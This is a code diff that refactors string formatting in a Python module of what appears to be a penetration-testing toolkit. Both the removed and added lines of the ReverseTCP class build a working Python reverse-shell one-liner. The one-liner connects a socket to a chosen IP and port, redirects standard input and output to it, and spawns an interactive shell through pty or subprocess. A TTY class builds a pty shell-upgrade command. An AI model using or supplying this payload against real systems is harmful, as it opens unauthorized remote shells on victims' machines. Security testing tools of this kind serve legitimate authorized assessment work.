@@ -32,13 +32,13 @@ class ReverseTCP(plugin.ReverseShell):
         self.opts.description += "\nModule author: Nguyen Hoang Thanh <smith.nguyenhoangthanh@gmail.com>"
 
     def make_shell(self):
-        self.shell = """{} -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,""".format(self.args.type)
-        self.shell += """socket.SOCK_STREAM);s.connect(("{}",{}));""".format(self.args.ip, self.args.port)
+        self.shell = f"""{self.args.type} -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,"""
+        self.shell += f"""socket.SOCK_STREAM);s.connect(("{self.args.ip}",{self.args.port}));"""
         self.shell += """os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(), 2);"""
         if self.args.exec == "pty":
-            self.shell += """import pty;pty.spawn("{}")'""".format(self.args.shell)
+            self.shell += f"""import pty;pty.spawn("{self.args.shell}")'"""
         elif self.args.exec == "subprocess":
-            self.shell += """p=subprocess.call(["{}","-i"]);'""".format(self.args.shell)
+            self.shell += f"""p=subprocess.call(["{self.args.shell}","-i"]);'"""
 
 
 class TTY(plugin.Module):
@@ -64,4 +64,4 @@ class TTY(plugin.Module):
         self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"
 
     def make_shell(self):
-        self.shell = """{} -c 'import pty; pty.spawn("{}")'""".format(self.args.type, self.args.shell)
+        self.shell = f"""{self.args.type} -c 'import pty; pty.spawn("{self.args.shell}")'"""
